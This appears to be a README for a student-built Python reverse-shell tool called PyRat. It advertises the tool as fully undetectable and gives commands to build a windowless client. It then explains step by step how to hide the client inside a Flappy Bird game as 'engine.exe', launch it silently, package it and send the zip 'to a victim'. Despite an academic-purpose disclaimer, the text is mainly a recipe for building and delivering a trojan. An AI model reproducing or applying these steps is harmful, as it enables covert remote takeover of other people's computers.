<h1 align="center">PyRat: ReverseShell</h1>
<p align="center">A Fully Undetectable Python 3 Reverse Shell Script</p>

<hr>
<h2 align="center">Disclaimer</h2>
<p align="center">
Developed by <b>Gerard Ian M. Balaoro</b><br>
In Partial Fulfillment on the Requirements for the Subject<br>
LIS 198: Information Security<br>
1st Semester, A.Y. 2018-2019<br>
University of the Philippines Diliman
<br><br>
<i>The author intended this to be used solely for academic purposes</i>
</p>
<hr>



## Usage

- Install required Python packages.

   ```
   pip install -r packages.txt
   ```

- Run the server script.

   ```
   python server.py --port 58777
   ```

- Configure server settings inside **config.ini**.

  ```json
  {
    "host":"127.0.0.1",
    "port":58777
  }

  ```
  
- Run client script in another computer.


## Building Binaries Using PyInstaller (Windows)

- Server script

  ```bash
  pyinstaller server.py -F -y -i shell.ico --name "RevShellServer" --specpath "build/" 
  ```
  
- Client script, use the `windowed` option to prevent the script from launching a command window

  ```bash
  pyinstaller client.py -F -y -i gear.ico --name "RevShellClient" --specpath "build/"
  pyinstaller client.py -F -y -i gear.ico --name "RevShellPayload" --specpath "build/" --windowed
  ```

## Building Trojan Executables (Windows)


### Injecting the client script inside the parent entry script.

It's faily easy to integrate this script to any Python application. In this example, we will use this [Flappy Bird Game](https://github.com/sourabhv/FlapPyBird) recreated by [Sourabh Verma](https://github.com/sourabhv/) using the PyGame library.

All we need to do is execute the client script silently whenever the game is initialized. We also need to think of an unsuspicous name
to use when compiling the client script, in this case, we're using **'engine.exe'**. This can be accomplished using Python's `subprocess` library:

```python
import subprocess
payload = subprocess.Popen('engine', shell = True, stdout= None, stderr = None, stdin = None)
```


### Building the Game Package Using cx_Freeze

This is a snippet of our setup script defining the executable binaries to be compiled:

```python
executables = [
    cx_Freeze.Executable(
        script          = 'flappy.py',
        base            = 'Win32GUI', 
        targetName      = 'flappybird.exe',
        icon            = 'assets/icons/flappy.ico',
        shortcutName    = 'FlappyBird'
    ),
    cx_Freeze.Executable(
        script          = 'client.py',
        base            = 'Win32GUI', 
        targetName      = 'engine.exe',
        icon            = 'assets/icons/gear.ico'
    )
]
```

Then execute the build script:

```
python setup.py build
```

Once done, we can now see our Trojan application inside the `build/` directory. All there's left to do is to change the configuration settings, compress this to a **zip** file and send it to a victim.

```
.
├── ...
├── config.ini  # Server settings
├── engine.exe  # Concealed payload
├── flappybird.exe 
└── ...
```

## Credits

- This script is based on [this article](https://null-byte.wonderhowto.com/how-to/reverse-shell-using-python-0163875/) from WonderHowTo.com
